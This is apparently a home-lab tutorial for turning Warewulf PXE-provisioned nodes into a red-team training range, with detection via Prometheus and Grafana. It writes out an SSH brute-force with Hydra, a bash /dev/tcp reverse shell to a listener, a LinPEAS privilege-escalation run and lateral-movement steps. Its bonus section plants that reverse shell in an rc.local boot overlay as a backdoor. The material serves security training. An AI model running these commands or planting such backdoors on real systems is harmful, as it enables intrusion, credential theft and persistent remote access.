🧨 Task 5 – Simulate Attacks Using Red Team Labs on Provisioned PXE Nodes
Objective:
Turn your Warewulf-provisioned nodes into a live-fire Red Team training ground. You’ll simulate real-world attack vectors including:

Credential harvesting

Reverse shells

Exploiting vulnerable services

Privilege escalation

Basic lateral movement

All staged within your controlled PXE/Kubernetes hybrid lab.

🧠 Why Red Team Simulation in PXE Labs?
You're no longer just deploying systems — you're building resilient infrastructure. That means you need to:

Test defenses

Validate monitoring

Understand attacker behavior

Train for incident response

Red Team simulations bridge the gap between theory and the battlefield — and Warewulf nodes are the perfect disposable, reproducible targets.

🔧 Step 1: Choose a Target Node
Pick a provisioned Warewulf node. For this guide:

PXE/K8s Master: 192.168.200.25

Target Node: rocky02.lab.local (192.168.200.51)

Target Container: rockylinux-9-lab

Runtime overlay: generic

Ensure it’s up and reachable:

bash
Copy
Edit
ping rocky02.lab.local
ssh root@rocky02.lab.local
🧰 Step 2: Prepare the Red Team Toolkit
Install tools on your control host (your PXE server or Kali VM):

bash
Copy
Edit
sudo dnf install -y nmap netcat john hydra hping3 metasploit
Also recommended:

msfconsole for advanced exploits

impacket for SMB, Kerberos, and AD enumeration

🔥 Step 3: Simulate a Credential Attack (SSH Brute Force)
🧪 Use Hydra from the PXE Server:
bash
Copy
Edit
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://rocky02.lab.local
Expected Output:

text
Copy
Edit
[22][ssh] host: rocky02.lab.local   login: root   password: toor
If successful, you’ve validated:

SSH is exposed

No rate limiting

Password is weak

✅ Use this to test Fail2Ban or enforce stronger keys via overlay.

🧫 Step 4: Deploy a Vulnerable Web App
SSH into the Warewulf container or edit the overlay to add:

bash
Copy
Edit
dnf install -y httpd php
mkdir -p /var/www/html
cd /var/www/html
wget https://github.com/ethicalhack3r/DVWA/archive/refs/heads/master.zip
unzip master.zip
mv DVWA-master dvwa
Enable and start Apache:

bash
Copy
Edit
systemctl enable --now httpd
Access from your PXE host:

bash
Copy
Edit
curl http://rocky02.lab.local/dvwa/
🎯 Step 5: Launch a Reverse Shell
On PXE Attacker:
bash
Copy
Edit
nc -lvnp 4444
On Target Node (simulate compromise):
bash
Copy
Edit
bash -i >& /dev/tcp/192.168.200.25/4444 0>&1
✅ Now you have a remote shell — build alerts in Prometheus or Grafana when this traffic is detected.

🧪 Step 6: Privilege Escalation with LinPEAS
From your PXE server:

bash
Copy
Edit
scp linpeas.sh root@rocky02.lab.local:/tmp/
ssh root@rocky02.lab.local 'bash /tmp/linpeas.sh'
Look for:

Sudo misconfigs

Writable cron jobs

SUID binaries

World-writeable services

🕵️ Step 7: Lateral Movement (Optional)
PXE nodes are on the same subnet. Try scanning with:

bash
Copy
Edit
nmap -sP 192.168.200.0/24
Then try:

bash
Copy
Edit
ssh-copy-id root@rocky03.lab.local
Success? You just simulated credential reuse.

🔒 Step 8: Detect Attacks with Prometheus + Grafana
Add node-specific metrics like:

bash
Copy
Edit
process_start_time_seconds{job="node_exporter",instance="rocky02:9100"}
Or track sshd auth failures from /var/log/secure using custom exporters or log scrapers.

Create Grafana alerts on:

Unusual memory spikes

New listening ports

Reboot events

Failed login bursts

🧹 Step 9: Clean Up or Rebuild
PXE + Warewulf = stateless nodes.

To clean a compromised node:

bash
Copy
Edit
wwctl power cycle rocky02
It reboots into a clean container image.

To make permanent changes to simulate persistence:

Inject malware or backdoors into your container overlay

Modify rc.local or systemd units

To reset:

bash
Copy
Edit
wwctl container build rockylinux-9-lab
🧩 Bonus: Automate Red Team Labs via Overlay Scripts
Example:

bash
Copy
Edit
vim overlays/redteam/etc/rc.local
bash
Copy
Edit
#!/bin/bash
bash -i >& /dev/tcp/192.168.200.25/4444 0>&1
Then assign:

bash
Copy
Edit
wwctl node set rocky02 --runtime-overlay redteam
wwctl overlay build
Reboot the node and it will self-compromise.

📚 Real-World Use Cases
Use Case	Description
SOC Simulation	Run detection playbooks in Grafana
Blue Team Training	Monitor and alert on malicious behavior
Red Team Lab	Practice privilege escalation and shell access
Pentest Practice	Use Metasploit and manual techniques
Malware Detection	Watch for persistence via cron/systemd

✅ Summary
What You Did	Skill Developed
Brute-force SSH	Network auth testing
Reverse shell	C2 simulation
LinPEAS scan	Privilege escalation mapping
PXE rebuild	Resilience and recovery
Grafana alerts	Detection engineering

You’ve successfully turned your home lab into a Red Team testing ground — repeatable, controlled, and enterprise-realistic.